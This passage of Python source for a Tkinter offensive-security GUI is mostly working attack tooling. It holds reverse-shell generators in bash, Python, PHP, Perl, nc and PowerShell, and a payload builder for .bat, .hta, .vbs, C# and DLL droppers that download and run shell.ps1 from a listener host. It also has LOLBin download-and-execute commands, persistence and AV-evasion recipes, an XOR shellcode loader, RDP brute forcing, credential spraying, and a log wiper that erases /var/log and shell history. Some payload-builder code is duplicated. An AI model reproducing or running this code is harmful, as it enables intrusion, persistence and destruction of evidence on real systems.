            threading.Thread(target=lambda: os.system(cmd), daemon=True).start()
            self.pivot_output.insert(tk.END, f"[+] Launched: {cmd}\n")
        except Exception as e:
            self.pivot_output.insert(tk.END, f"[!] Error: {e}\n")

    def init_remote_tab(self):
        self._styled_label(self.remote_tab, "Remote Access Tools (RDP & SMB)")

        self._styled_label(self.remote_tab, "Target IP")
        self.remote_ip_entry = self._styled_entry(self.remote_tab, "10.10.10.10")

        btn_frame = tk.Frame(self.remote_tab, bg=self.THEME["bg"])
        btn_frame.pack(pady=4)

        self._styled_button(btn_frame, "RDP BruteForce (hydra)", self.rdp_brute)
        self._styled_button(btn_frame, "List SMB Shares", self.smb_list)
        self._styled_button(btn_frame, "Mount SMB Share", self.smb_mount)
        self._styled_button(btn_frame, "Check Open Ports (3389/445)", self.check_remote_ports)

        self.remote_output = self._styled_text(self.remote_tab, height=20)

    def rdp_brute(self):
        ip = self.remote_ip_entry.get()
        wordlist = "/usr/share/wordlists/rockyou.txt"
        cmd = f"hydra -t 4 -V -f -L users.txt -P {wordlist} rdp://{ip}"
        self.remote_output.insert(tk.END, f"[Hydra] {cmd}\n")

    def smb_list(self):
        ip = self.remote_ip_entry.get()
        try:
            out = run_command(f"smbclient -L \\{ip} -N")
            self.remote_output.insert(tk.END, f"[SMB Shares on {ip}]\n{out}\n")
        except Exception as e:
            self.remote_output.insert(tk.END, f"[!] Error: {e}\n")

    def smb_mount(self):
        ip = self.remote_ip_entry.get()
        path = filedialog.askdirectory(title="Choose local mount point")
        if not path:
            return
        try:
            mount_cmd = f"sudo mount -t cifs //{ip}/share {path} -o guest"
            os.system(mount_cmd)
            self.remote_output.insert(tk.END, f"[+] Mounted //{ip}/share to {path}\n")
        except:
            self.remote_output.insert(tk.END, "[!] Mount failed\n")

    def check_remote_ports(self):
        ip = self.remote_ip_entry.get()
        try:
            result = run_command(f"nc -zv {ip} 3389; nc -zv {ip} 445")
            self.remote_output.insert(tk.END, result + "\n")
        except Exception as e:
            self.remote_output.insert(tk.END, f"[!] Error: {e}\n")

    def init_network_tab(self):
        self._styled_label(self.network_tab, "Network Mapping & ARP Scan")

        self._styled_label(self.network_tab, "Target Network/Subnet")
        self.net_entry = self._styled_entry(self.network_tab, "192.168.1.0/24")

        btn_frame = tk.Frame(self.network_tab, bg=self.THEME["bg"])
        btn_frame.pack(pady=4)

        self._styled_button(btn_frame, "ARP Scan", self.arp_scan)
        self._styled_button(btn_frame, "Ping Sweep", self.ping_sweep)
        self._styled_button(btn_frame, "Netdiscover (summary)", self.netdiscover_scan)
        self._styled_button(btn_frame, "Show Hostnames", self.get_hostnames)

        self.net_output = self._styled_text(self.network_tab, height=20)

    def arp_scan(self):
        net = self.net_entry.get()
        out = run_command(f"arp-scan {net}")
        self.net_output.delete(1.0, tk.END)
        self.net_output.insert(tk.END, out)

    def ping_sweep(self):
        net = self.net_entry.get()
        cmd = f"for ip in $(seq 1 254); do ping -c1 -W1 {net[:-4]}$ip | grep '64 bytes' & done; wait"
        out = run_command(cmd)
        self.net_output.delete(1.0, tk.END)
        self.net_output.insert(tk.END, out)

    def netdiscover_scan(self):
        out = run_command("netdiscover -P -r 192.168.1.0/24 | grep -v '^\\[...\\]'")
        self.net_output.delete(1.0, tk.END)
        self.net_output.insert(tk.END, out)

    def get_hostnames(self):
        net = self.net_entry.get()
        lines = []
        for i in range(1, 255):
            ip = net[:-4] + str(i)
            try:
                hostname = socket.gethostbyaddr(ip)[0]
                lines.append(f"{ip} -> {hostname}")
            except:
                continue
        self.net_output.delete(1.0, tk.END)
        if lines:
            self.net_output.insert(tk.END, "\n".join(lines))
        else:
            self.net_output.insert(tk.END, "[*] No hostnames found\n")

    def init_exploit_finder_tab(self):
        self._styled_label(self.exploit_finder_tab, "Exploit Finder (searchsploit)")

        self._styled_label(self.exploit_finder_tab, "Search Term")
        self.exploit_search_entry = self._styled_entry(self.exploit_finder_tab, "apache")

        self._styled_button(self.exploit_finder_tab, "Search Exploits", self.search_exploits)
        self.exploit_results = self._styled_text(self.exploit_finder_tab, height=25)

    def search_exploits(self):
        term = self.exploit_search_entry.get()
        try:
            result = run_command(f"searchsploit {term}")
            if not result.strip():
                self.exploit_results.insert(tk.END, f"No results for: {term}\n")
            else:
                self.exploit_results.delete(1.0, tk.END)
                self.exploit_results.insert(tk.END, result[:3000] + "\n")
        except Exception as e:
            self.exploit_results.insert(tk.END, f"[!] searchsploit error: {e}\n")

    def init_drag_tab(self):
        self._styled_label(self.drag_tab, "Drag & Drop Script Executor")

        self.drag_info = self._styled_text(self.drag_tab, height=4)
        self.drag_info.insert(tk.END, "Drop a .sh, .py, .bat, .ps1, .exe file here for execution preview.")
        self.drag_info.configure(state='disabled')

        self.drag_drop_frame = tk.Label(self.drag_tab, text="Drop Files Here", height=8, bg="#222", fg="white", relief="sunken")
        self.drag_drop_frame.pack(padx=8, pady=8, fill="both")
        self.drag_drop_frame.bind("<Button-1>", self.select_script)

        self._styled_button(self.drag_tab, "Open File", self.select_script)
        self.script_output = self._styled_text(self.drag_tab, height=18)

    def select_script(self, event=None):
        path = filedialog.askopenfilename(filetypes=[("Script files", "*.sh *.py *.ps1 *.bat *.exe")])
        if path:
            self.script_output.delete(1.0, tk.END)
            self.script_output.insert(tk.END, f"[Selected] {path}\n")
            try:
                if path.endswith(".sh"):
                    out = run_command(f"bash {path}")
                elif path.endswith(".py"):
                    out = run_command(f"python3 {path}")
                elif path.endswith(".ps1"):
                    out = run_command(f"pwsh -c {path}")
                elif path.endswith(".bat") or path.endswith(".exe"):
                    out = run_command(path)
                else:
                    out = "[!] Unsupported format."
                self.script_output.insert(tk.END, out[:3000])
            except Exception as e:
                self.script_output.insert(tk.END, f"[!] Execution failed: {e}")

    def init_interactive_tab(self):
        self._styled_label(self.interactive_tab, "Interactive Shell")

        self._styled_label(self.interactive_tab, "Command Input")
        self.shell_cmd_entry = self._styled_entry(self.interactive_tab)
        self.shell_cmd_entry.bind("<Return>", self.run_shell_command)
        self.shell_cmd_entry.bind("<Up>", self.shell_history_up)
        self.shell_cmd_entry.bind("<Down>", self.shell_history_down)

        self._styled_button(self.interactive_tab, "Run", self.run_shell_command)
        self._styled_button(self.interactive_tab, "Clear Output", lambda: self.shell_output.delete(1.0, tk.END))
        self._styled_button(self.interactive_tab, "Save Output", self.save_shell_output)

        self.shell_output = self._styled_text(self.interactive_tab, height=25)

        self.shell_history = []
        self.shell_index = -1

    def run_shell_command(self, event=None):
        cmd = self.shell_cmd_entry.get()
        if cmd:
            self.shell_output.insert(tk.END, f"$ {cmd}\n")
            output = run_command(cmd)
            self.shell_output.insert(tk.END, output + "\n")
            self.shell_history.append(cmd)
            self.shell_index = len(self.shell_history)
            self.shell_cmd_entry.delete(0, tk.END)

    def shell_history_up(self, event):
        if self.shell_history:
            self.shell_index = max(0, self.shell_index - 1)
            self.shell_cmd_entry.delete(0, tk.END)
            self.shell_cmd_entry.insert(0, self.shell_history[self.shell_index])

    def shell_history_down(self, event):
        if self.shell_history:
            self.shell_index = min(len(self.shell_history), self.shell_index + 1)
            if self.shell_index < len(self.shell_history):
                self.shell_cmd_entry.delete(0, tk.END)
                self.shell_cmd_entry.insert(0, self.shell_history[self.shell_index])
            else:
                self.shell_cmd_entry.delete(0, tk.END)

    def save_shell_output(self):
        path = filedialog.asksaveasfilename(defaultextension=".txt")
        if path:
            with open(path, "w", encoding="utf-8") as f:
                f.write(self.shell_output.get(1.0, tk.END))

    def init_php_eval_tab(self):
        self._styled_label(self.eval_tab, "PHP Eval Tester")

        self._styled_label(self.eval_tab, "Target URL (e.g. http://site.com/shell.php)")
        self.eval_url_entry = self._styled_entry(self.eval_tab, "http://target/shell.php")

        self._styled_label(self.eval_tab, "PHP Payload / Command (e.g. system('id');)")
        self.eval_cmd_entry = self._styled_entry(self.eval_tab, "system('id');")

        self._styled_button(self.eval_tab, "Send Payload (POST cmd)", self.eval_post_payload)
        self._styled_button(self.eval_tab, "Send Payload (GET cmd)", self.eval_get_payload)

        self.eval_output = self._styled_text(self.eval_tab, height=25)

    def eval_post_payload(self):
        import requests
        url = self.eval_url_entry.get()
        payload = self.eval_cmd_entry.get()
        try:
            r = requests.post(url, data={"cmd": payload}, timeout=5)
            self.eval_output.delete(1.0, tk.END)
            self.eval_output.insert(tk.END, r.text)
        except Exception as e:
            self.eval_output.insert(tk.END, f"[!] POST Error: {e}\n")

    def eval_get_payload(self):
        import requests
        url = self.eval_url_entry.get()
        payload = self.eval_cmd_entry.get()
        try:
            r = requests.get(url, params={"cmd": payload}, timeout=5)
            self.eval_output.delete(1.0, tk.END)
            self.eval_output.insert(tk.END, r.text)
        except Exception as e:
            self.eval_output.insert(tk.END, f"[!] GET Error: {e}\n")

    def scan_suid_capabilities(self):
        self.enum_output.insert(tk.END, "[*] SUID Binaries:\n")
        suid = run_command("find / -perm -4000 -type f 2>/dev/null")
        self.enum_output.insert(tk.END, suid[:3000] + "\n")

        self.enum_output.insert(tk.END, "\n[*] Capabilities:\n")
        caps = run_command("getcap -r / 2>/dev/null")
        self.enum_output.insert(tk.END, caps[:3000] + "\n")

        self.enum_output.insert(tk.END, "\n[!] Dangerous Binaries (from GTFOBins):\n")
        dangerous = []
        keywords = ["nmap", "perl", "python", "bash", "vim", "cp", "find", "tar", "less", "env"]
        for line in suid.splitlines():
            if any(k in line for k in keywords):
                dangerous.append("[SUID] " + line)
        for line in caps.splitlines():
            if any(k in line for k in keywords):
                dangerous.append("[CAP]  " + line)
        if dangerous:
            self.enum_output.insert(tk.END, "\n".join(dangerous) + "\n")
        else:
            self.enum_output.insert(tk.END, "No dangerous SUID/Capability binaries found.\n")

    def init_reverse_shell_generator(self):
        self._styled_label(self.reverse_tab, "Generate Reverse Shell (All Languages)")

        ip_port_frame = tk.Frame(self.reverse_tab, bg=self.THEME["bg"])
        ip_port_frame.pack(pady=2)

        self._styled_label(ip_port_frame, "LHOST")
        self.revgen_ip = self._styled_entry(ip_port_frame, "10.10.14.1")

        self._styled_label(ip_port_frame, "LPORT")
        self.revgen_port = self._styled_entry(ip_port_frame, "9001")

        self.revgen_result = self._styled_text(self.reverse_tab, height=12)

        self._styled_button(self.reverse_tab, "Generate All Payloads", self.generate_all_reverse)

    def generate_all_reverse(self):
        ip = self.revgen_ip.get()
        port = self.revgen_port.get()
        payloads = {
            "Bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "Python": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'",
            "PHP": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "Perl": f"perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'",
            "NC": f"nc -e /bin/sh {ip} {port}"
        }

        self.revgen_result.delete(1.0, tk.END)
        for name, code in payloads.items():
            self.revgen_result.insert(tk.END, f"[{name}]
{code}

")

    def init_port_forwarding_toolkit(self):
        self._styled_label(self.pivoting_tab, "Port Forwarding Toolkit")

        self._styled_label(self.pivoting_tab, "LHOST")
        self.fwd_lhost = self._styled_entry(self.pivoting_tab, "10.10.14.1")

        self._styled_label(self.pivoting_tab, "LPORT")
        self.fwd_lport = self._styled_entry(self.pivoting_tab, "1080")

        self._styled_label(self.pivoting_tab, "RHOST (internal target)")
        self.fwd_rhost = self._styled_entry(self.pivoting_tab, "10.10.10.5")

        self._styled_label(self.pivoting_tab, "RPORT")
        self.fwd_rport = self._styled_entry(self.pivoting_tab, "80")

        self._styled_button(self.pivoting_tab, "Generate SSH -R Command", self.gen_ssh_reverse)
        self._styled_button(self.pivoting_tab, "Generate socat Bind", self.gen_socat_bind)

        self.portfwd_output = self._styled_text(self.pivoting_tab, height=14)

    def gen_ssh_reverse(self):
        lh, lp, rh, rp = self.fwd_lhost.get(), self.fwd_lport.get(), self.fwd_rhost.get(), self.fwd_rport.get()
        cmd = f"ssh -R {lp}:{rh}:{rp} user@{lh}"
        self.portfwd_output.delete(1.0, tk.END)
        self.portfwd_output.insert(tk.END, f"[SSH Reverse]
{cmd}
")

    def gen_socat_bind(self):
        lh, lp, rh, rp = self.fwd_lhost.get(), self.fwd_lport.get(), self.fwd_rhost.get(), self.fwd_rport.get()
        cmd = f"socat TCP-LISTEN:{lp},fork TCP:{rh}:{rp}"
        self.portfwd_output.delete(1.0, tk.END)
        self.portfwd_output.insert(tk.END, f"[socat Bind]
{cmd}
")

    def init_shell_upgrader(self):
        self._styled_label(self.interactive_tab, "Shell Upgrader Cheats")

        upgrader_text = """[Python TTY Shell]
python3 -c 'import pty; pty.spawn("/bin/bash")'

[Script Shell]
script /bin/bash

[stty Fix]
CTRL-Z
stty raw -echo
fg
reset

[Full TTY via socat]
Attacker: socat file:`tty`,raw,echo=0 tcp-listen:4444
Victim:   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{IP}:4444
"""

        self.upgrade_box = tk.Text(self.interactive_tab, height=10, bg="#222", fg="lime", insertbackground="white")
        self.upgrade_box.pack(fill="both", padx=6, pady=6)
        self.upgrade_box.insert(tk.END, upgrader_text)
        self.upgrade_box.configure(state="disabled")

    def init_log_wiper(self):
        self._styled_label(self.persistence_tab, "Log Wiper (Evidence Remover)")

        btn_frame = tk.Frame(self.persistence_tab, bg=self.THEME["bg"])
        btn_frame.pack(pady=4)

        self._styled_button(btn_frame, "Wipe /var/log/*", lambda: self.wipe_logs("/var/log/*"))
        self._styled_button(btn_frame, "Clear ~/.bash_history", lambda: self.wipe_logs("~/.bash_history"))
        self._styled_button(btn_frame, "Clear /root/.bash_history", lambda: self.wipe_logs("/root/.bash_history"))
        self._styled_button(btn_frame, "Custom Path Wipe", self.custom_log_wipe)

        self.logwipe_entry = self._styled_entry(self.persistence_tab, "/var/log/auth.log")
        self.logwipe_output = self._styled_text(self.persistence_tab, height=8)

    def wipe_logs(self, path):
        try:
            os.system(f"> {path}")
            self.logwipe_output.insert(tk.END, f"[+] Wiped: {path}\n")
        except Exception as e:
            self.logwipe_output.insert(tk.END, f"[!] Error: {e}\n")

    def custom_log_wipe(self):
        path = self.logwipe_entry.get()
        self.wipe_logs(path)

    def init_redteam_tab(self):
        self._styled_label(self.redteam_tab, "Red Team Ops - Remote Execution")

        self._styled_label(self.redteam_tab, "Target IP / Hostname")
        self.red_ip = self._styled_entry(self.redteam_tab, "10.10.10.5")

        self._styled_label(self.redteam_tab, "Username")
        self.red_user = self._styled_entry(self.redteam_tab, "Administrator")

        self._styled_label(self.redteam_tab, "Password")
        self.red_pass = self._styled_entry(self.redteam_tab, "Password123")

        self._styled_label(self.redteam_tab, "Domain (Optional)")
        self.red_domain = self._styled_entry(self.redteam_tab, "WORKGROUP")

        self._styled_label(self.redteam_tab, "Command to Execute")
        self.red_cmd = self._styled_entry(self.redteam_tab, "whoami")

        btn_frame = tk.Frame(self.redteam_tab, bg=self.THEME["bg"])
        btn_frame.pack(pady=4)

        self._styled_button(btn_frame, "Execute via WinRM", self.exec_winrm)
        self._styled_button(btn_frame, "Execute via SMB", self.exec_smb)

        self.redteam_output = self._styled_text(self.redteam_tab, height=20)

    def exec_winrm(self):
        try:
            from pypsrp.client import Client
            ip = self.red_ip.get()
            client = Client(ip, username=self.red_user.get(), password=self.red_pass.get(), ssl=False, auth="basic")
            output, _, _ = client.execute_cmd(self.red_cmd.get())
            self.redteam_output.delete(1.0, tk.END)
            self.redteam_output.insert(tk.END, output)
        except Exception as e:
            self.redteam_output.insert(tk.END, f"[!] WinRM error: {e}\n")

    def exec_smb(self):
        try:
            ip = self.red_ip.get()
            user = self.red_user.get()
            password = self.red_pass.get()
            cmd = self.red_cmd.get()
            domain = self.red_domain.get()
            exec_cmd = f"crackmapexec smb {ip} -u {user} -p {password} -d {domain} -x "{cmd}""
            output = run_command(exec_cmd)
            self.redteam_output.delete(1.0, tk.END)
            self.redteam_output.insert(tk.END, output)
        except Exception as e:
            self.redteam_output.insert(tk.END, f"[!] SMB exec error: {e}\n")

    def init_redteam_spraying(self):
        self._styled_label(self.redteam_tab, "Credential Spraying (SMB)")

        spray_frame = tk.Frame(self.redteam_tab, bg=self.THEME["bg"])
        spray_frame.pack(pady=4)

        self._styled_button(spray_frame, "Load Users File", self.load_users_file)
        self._styled_button(spray_frame, "Load Passwords File", self.load_passwords_file)
        self._styled_button(spray_frame, "Start Spray Attack", self.start_spray)

        self.users_path = ""
        self.passwords_path = ""

    def load_users_file(self):
        path = filedialog.askopenfilename(title="Select users.txt")
        if path:
            self.users_path = path
            self.redteam_output.insert(tk.END, f"[+] Users file loaded: {path}\n")

    def load_passwords_file(self):
        path = filedialog.askopenfilename(title="Select passwords.txt")
        if path:
            self.passwords_path = path
            self.redteam_output.insert(tk.END, f"[+] Passwords file loaded: {path}\n")

    def start_spray(self):
        if not self.users_path or not self.passwords_path:
            self.redteam_output.insert(tk.END, "[!] Please load both users and passwords files first.\n")
            return
        ip = self.red_ip.get()
        domain = self.red_domain.get()
        cmd = f"crackmapexec smb {ip} -u {self.users_path} -p {self.passwords_path} -d {domain}"
        self.redteam_output.insert(tk.END, f"[Spraying]
{cmd}
")
        output = run_command(cmd)
        self.redteam_output.insert(tk.END, output + "\n")

    def init_redteam_stealth(self):
        self._styled_label(self.redteam_tab, "Stealth Payload Generator & LOLBins")

        self._styled_label(self.redteam_tab, "LHOST")
        self.stealth_ip = self._styled_entry(self.redteam_tab, "10.10.14.1")

        self._styled_label(self.redteam_tab, "LPORT")
        self.stealth_port = self._styled_entry(self.redteam_tab, "4444")

        self._styled_button(self.redteam_tab, "Generate Obfuscated PowerShell Payload", self.generate_ps_payload)
        self._styled_button(self.redteam_tab, "Show LOLBins Examples", self.show_lolbins)

        self.stealth_output = self._styled_text(self.redteam_tab, height=20)

    def generate_ps_payload(self):
        ip = self.stealth_ip.get()
        port = self.stealth_port.get()
        payload = f"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
        self.stealth_output.delete(1.0, tk.END)
        self.stealth_output.insert(tk.END, f"[PowerShell Payload]
{payload}
")

    def show_lolbins(self):
        lolbin_commands = """
[certutil]
certutil -urlcache -f http://IP/shell.exe shell.exe

[regsvr32]
regsvr32 /s /n /u /i:http://IP/shell.sct scrobj.dll

[rundll32]
rundll32 javascript:"\..\mshtml,RunHTMLApplication ";document.write('<script src="http://IP/payload.js"></script>');

[wmic]
wmic process call create "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://IP/shell.ps1')"
"""
        self.stealth_output.delete(1.0, tk.END)
        self.stealth_output.insert(tk.END, lolbin_commands)

    def init_token_impersonation(self):
        self._styled_label(self.redteam_tab, "Token Impersonation Techniques")

        token_info = """
[PowerShell Token Enumeration]
whoami /groups
whoami /priv
Get-ProcessToken | fl *

[Impersonate a Token via incognito/metasploit]
use incognito
list_tokens -u
impersonate_token DOMAIN\User

[Invoke-TokenManipulation (PowerView)]
Invoke-TokenManipulation -ImpersonateUser "Administrator"

[CreateProcessWithTokenW]
CreateProcessWithTokenW.exe cmd.exe

[runas (limited)]
runas /user:DOMAIN\User cmd.exe
"""

        self.token_text = tk.Text(self.redteam_tab, height=10, bg="#111", fg="orange", insertbackground="white")
        self.token_text.pack(fill="both", padx=6, pady=4)
        self.token_text.insert(tk.END, token_info)
        self.token_text.configure(state="disabled")

    def init_dcom_abuse(self):
        self._styled_label(self.redteam_tab, "DCOM Abuse Techniques")

        self._styled_button(self.redteam_tab, "Show DCOM Execution Methods", self.show_dcom_examples)

        self.dcom_output = self._styled_text(self.redteam_tab, height=12)

    def show_dcom_examples(self):
        dcom_cmds = """
[MMC20.Application]
powershell -Command "$com = New-Object -ComObject MMC20.Application; $com.Document.ActiveView.ExecuteShellCommand('cmd.exe', '', 'whoami', '7')"

[ShellWindows]
powershell -Command "$com = New-Object -ComObject Shell.Application; $com.ShellExecute('cmd.exe','/c whoami')"

[Excel.Application]
powershell -Command "$xl = New-Object -ComObject Excel.Application; $xl.Visible = $false; $xl.Workbooks.Add(); $xl.Application.Run('calc.exe')"

[dcomexec.py]
python3 dcomexec.py DOMAIN/USER:PASSWORD@10.10.10.X "ipconfig /all"
"""
        self.dcom_output.delete(1.0, tk.END)
        self.dcom_output.insert(tk.END, dcom_cmds)

    def init_persistence_techniques(self):
        self._styled_label(self.redteam_tab, "Persistence Techniques")

        self._styled_button(self.redteam_tab, "Show Persistence Methods", self.show_persistence_examples)

        self.persistence_output = self._styled_text(self.redteam_tab, height=12)

    def show_persistence_examples(self):
        examples = """
[Registry Run Key]
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d "C:\\malware.exe" /f

[Schtasks]
schtasks /create /tn "Update" /tr "C:\\payload.exe" /sc minute /mo 5 /ru SYSTEM

[Startup Folder]
copy payload.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

[WMI Event Subscription]
PowerShell Empire: persistence/wmi

[Services Persistence]
sc create updater binPath= "C:\\backdoor.exe" start= auto

[DLL Hijacking]
Drop malicious DLL in app directory (example: chrome.exe loads version.dll)
"""
        self.persistence_output.delete(1.0, tk.END)
        self.persistence_output.insert(tk.END, examples)

    def init_av_evasion(self):
        self._styled_label(self.redteam_tab, "AV/EDR Evasion & Obfuscation")

        self._styled_button(self.redteam_tab, "Show Evasion Examples", self.show_av_evasion_examples)

        self.av_output = self._styled_text(self.redteam_tab, height=12)

    def show_av_evasion_examples(self):
        examples = """
[PowerShell Base64 Obfuscation]
$cmd = 'IEX(New-Object Net.WebClient).DownloadString("http://IP/payload.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
$encoded = [Convert]::ToBase64String($bytes)
powershell -encodedCommand $encoded

[msfvenom XOR payload]
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -e x86/shikata_ga_nai -i 3 -f exe > rev.exe

[Certutil Dropper]
certutil -urlcache -split -f http://IP/rev.exe rev.exe

[HTA Payload Launcher]
mshta.exe http://IP/payload.hta

[Regsvr32 Stager]
regsvr32 /s /n /u /i:http://IP/payload.sct scrobj.dll
"""
        self.av_output.delete(1.0, tk.END)
        self.av_output.insert(tk.END, examples)

    def init_payload_builder(self):
        self._styled_label(self.redteam_tab, "Payload Builder (HTA, BAT, PS1)")

        frame = tk.Frame(self.redteam_tab, bg=self.THEME["bg"])
        frame.pack(pady=2)

        self._styled_label(frame, "LHOST")
        self.builder_ip = self._styled_entry(frame, "10.10.14.1")

        self._styled_label(frame, "LPORT")
        self.builder_port = self._styled_entry(frame, "9001")

        self._styled_label(frame, "Payload Format")
        self.builder_format = ttk.Combobox(frame, values=[".bat", ".ps1", ".hta", ".vbs", ".cs", ".dll"], width=10)
        self.builder_format.set(".bat")
        self.builder_format.pack(pady=3)

        self._styled_button(self.redteam_tab, "Generate Payload", self.generate_payload)
        self._styled_button(self.redteam_tab, "Save to File", self.save_payload_to_file)

        self.payload_output = self._styled_text(self.redteam_tab, height=15)

    def generate_payload(self):
        ip = self.builder_ip.get()
        port = self.builder_port.get()
        fmt = self.builder_format.get()
        payload = ""

        if fmt == ".bat":
            payload = f"@echo off\npowershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{port}/shell.ps1')\""
        elif fmt == ".ps1":
            payload = f"$client = New-Object Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();..."
        elif fmt == ".hta":
            payload = f"<script>var s = new ActiveXObject('WScript.Shell'); s.Run('powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(\'http://{ip}:{port}/shell.ps1\')\"');self.close();</script>"
        elif fmt == ".vbs":
            payload = f"""Set shell = CreateObject("WScript.Shell")
shell.Run "powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{port}/shell.ps1')" """
        elif fmt == ".cs":
            payload = f"""using System;
using System.Net;
using System.Diagnostics;

namespace Launcher {{
    class Program {{
        static void Main(string[] args) {{
            WebClient wc = new WebClient();
            string cmd = wc.DownloadString("http://{ip}:{port}/shell.ps1");
            Process.Start("powershell", "-w hidden -c " + cmd);
        }}
    }}
}}"""
        elif fmt == ".dll":
            payload = f"""#include <windows.h>
#include <stdlib.h>

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {{
    if (fdwReason == DLL_PROCESS_ATTACH) {{
        WinExec("powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{port}/shell.ps1')", 0);
    }}
    return TRUE;
}}
/* Compile with:
x86_64-w64-mingw32-gcc payload.c -shared -o payload.dll
*/"""

        self.payload_output.delete(1.0, tk.END)
        self.payload_output.insert(tk.END, payload)
        if fmt == ".bat":
            payload = f"@echo off\npowershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{port}/shell.ps1')\""
        elif fmt == ".ps1":
            payload = f"$client = New-Object Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();..."
        elif fmt == ".hta":
            payload = f"<script>var s = new ActiveXObject('WScript.Shell'); s.Run('powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(\'http://{ip}:{port}/shell.ps1\')\"');self.close();</script>"
        elif fmt == ".vbs":
            payload = f"""Set shell = CreateObject("WScript.Shell")
shell.Run "powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{port}/shell.ps1')" """
        elif fmt == ".cs":
            payload = f"""using System;
using System.Net;
using System.Diagnostics;

namespace Launcher {{
    class Program {{
        static void Main(string[] args) {{
            WebClient wc = new WebClient();
            string cmd = wc.DownloadString("http://{ip}:{port}/shell.ps1");
            Process.Start("powershell", "-w hidden -c " + cmd);
        }}
    }}
}}"""

        self.payload_output.delete(1.0, tk.END)
        self.payload_output.insert(tk.END, payload)
        if fmt == ".bat":
            payload = f"@echo off\npowershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://{ip}:{port}/shell.ps1')\""
        elif fmt == ".ps1":
            payload = f"$client = New-Object Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();..."
        elif fmt == ".hta":
            payload = f"<script>var s = new ActiveXObject('WScript.Shell'); s.Run('powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(\'http://{ip}:{port}/shell.ps1\')\"');self.close();</script>"

        self.payload_output.delete(1.0, tk.END)
        self.payload_output.insert(tk.END, payload)

    def save_payload_to_file(self):
        path = filedialog.asksaveasfilename(defaultextension=self.builder_format.get())
        if path:
            with open(path, "w", encoding="utf-8") as f:
                f.write(self.payload_output.get(1.0, tk.END))

    def init_shellcode_obfuscator(self):
        self._styled_label(self.redteam_tab, "Shellcode Obfuscator & C Injector")

        self._styled_label(self.redteam_tab, "XOR Key (1 byte, e.g. 0xAA)")
        self.xor_key_entry = self._styled_entry(self.redteam_tab, "0xAA")

        self._styled_label(self.redteam_tab, "Shellcode (comma-separated bytes)")
        self.shellcode_input = self._styled_entry(self.redteam_tab, "0xfc,0x48,0x83,0xe4,0xf0,...")

        self._styled_button(self.redteam_tab, "Generate Encoded C Loader", self.generate_c_loader_shellcode)

        self.shellcode_output = self._styled_text(self.redteam_tab, height=14)

    def generate_c_loader_shellcode(self):
        xor_key = self.xor_key_entry.get()
        key = int(xor_key, 16)
        try:
            raw = self.shellcode_input.get()
            shellcode = [int(x.strip(), 16) for x in raw.split(",") if x.strip()]
            encoded = [b ^ key for b in shellcode]
            encoded_bytes = ",".join([f"0x{b:02x}" for b in encoded])

            c_loader = f"""#include <windows.h>
unsigned char buf[] = {{{encoded_bytes}}};
int main() {{
    for(int i=0; i<sizeof(buf); i++) buf[i] ^= {key};
    void *exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buf, sizeof(buf));
    ((void(*)())exec)();
    return 0;
}}"""
            self.shellcode_output.delete(1.0, tk.END)
            self.shellcode_output.insert(tk.END, c_loader)
        except Exception as e:
            self.shellcode_output.insert(tk.END, f"[!] Error: {e}\n")

    def init_kerberoast_module(self):
        self._styled_label(self.redteam_tab, "Kerberoasting & ASREPRoast")

        self._styled_label(self.redteam_tab, "Target IP / DC")
        self.roast_ip = self._styled_entry(self.redteam_tab, "10.10.10.5")

        self._styled_label(self.redteam_tab, "Domain")
        self.roast_domain = self._styled_entry(self.redteam_tab, "HTB.LOCAL")

        self._styled_label(self.redteam_tab, "Username")
        self.roast_user = self._styled_entry(self.redteam_tab, "Administrator")

        self._styled_label(self.redteam_tab, "Password")
        self.roast_pass = self._styled_entry(self.redteam_tab, "Password123")

        btn_frame = tk.Frame(self.redteam_tab, bg=self.THEME["bg"])
        btn_frame.pack(pady=3)

        self._styled_button(btn_frame, "Run ASREPRoast (GetNPUsers)", self.run_asrep_roast)
        self._styled_button(btn_frame, "Run Kerberoast (GetUserSPNs)", self.run_kerberoast)

        self.roast_output = self._styled_text(self.redteam_tab, height=12)

    def run_asrep_roast(self):
